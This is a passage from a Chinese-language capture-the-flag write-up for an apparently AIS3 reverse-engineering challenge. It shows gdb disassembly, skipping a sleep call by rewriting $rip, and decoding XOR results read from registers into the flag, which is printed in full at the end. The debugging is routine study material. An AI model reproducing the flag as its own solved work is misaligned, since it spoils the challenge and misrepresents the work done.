   0x0000000000001275 <+204>:   jle    0x11d4 <main+43>
   0x000000000000127b <+210>:   lea    rdi,[rip+0xe66]        # 0x20e8
   0x0000000000001282 <+217>:   call   0x1080 <puts@plt>
   0x0000000000001287 <+222>:   mov    eax,0x0
   0x000000000000128c <+227>:   leave
   0x000000000000128d <+228>:   ret

```
那我們先設一個 main的斷點 然後進去 原本想直接設一個斷點在sleep前一個但好像因為她有開保護機制 所以只能慢慢執行到那邊才可以看位置

![image](https://hackmd.io/_uploads/Bycu9uE4A.png)

我這裡卡一點時間 因為我原本是使用`n` 來執行下一步 但我發現一進去就都會卡住 改成`ni`後就不會卡了 一個小疑惑點 

一路ni 到sleep前面後把原本要被執行的sleep那句的`$rip`改成他的下一句 因為`$rip`會指向下一個要執行的指令 改掉後他就會跳過去了 用`set $rip = 0x555555555235` 再ni就可以成功跳過去 但前面有提到是迴圈 因此上面也要設斷點 不然他會進sleep 因為我知道他flag是XOR獲得 因此我另一個斷點設在XOR的下一行 也就是 `0x55555555521f` 並且運算完的資料會存到$rax 因此只要把每次迴圈出來的rdx的值拿去轉ASCII 就可以得到flag了

![image](https://hackmd.io/_uploads/SJpTWFEN0.png)

整理一次 在迴圈跳過四次指令後 就會跳到大迴圈 再到XOR的break 讀取$rdx 重複12次
$rax   : 0x33534941
$rax   : 0x454b4146 
$rax   : 0x756f597b 
$rax   : 0x6572615f
$rax   : 0x6568745f 
$rax   : 0x73616d5f   
$rax   : 0x5f726574 
$rax   : 0x745f666f 
$rax   : 0x5f656d69
$rax   : 0x616e616d 
$rax   : 0x656d6567 
$rax   : 0x2121746e
$rax   : 0x7d3f2121
轉成ASCII後倒過來看就是flag了 因為是LSB 因此要從最右邊兩個兩個往前看

![image](https://hackmd.io/_uploads/rJ4Et3NVC.png)

也可以從輸出看 跑完一次他會跳一個字出來只是變成要看很多次

![image](https://hackmd.io/_uploads/rydsD34NC.png)

`flag : AIS3{You_are_the_master_of_time_management!!!!?}`

![image](https://hackmd.io/_uploads/rJKPKhEN0.png)


